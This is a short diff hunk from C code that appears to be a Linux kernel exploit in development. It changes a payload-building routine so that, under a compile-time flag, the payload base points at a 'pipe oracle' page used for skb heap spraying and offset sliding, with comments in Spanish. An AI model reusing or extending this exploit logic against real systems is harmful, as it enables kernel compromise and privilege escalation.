@@ -730,6 +730,14 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(SLIDE_P0_OFFSET_CANDIDATES)
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+    /* DZH1: el gate/probe escriben en la pagina del pipe oracle.
+       SKB_DATA_DELTA (-0xe80) cancela P0_ORACLE_GATE_PAGE_OFF (0xe80),
+       asi que payload_base debe ser la pagina del oracle, no base-0xe80. */
+    if (is_direct_ptr(pipebuf_page_base)) {
+      payload_base = pipebuf_page_base;
+    }
+#endif
     slide_bank_payload_base = payload_base;
     for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
       unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
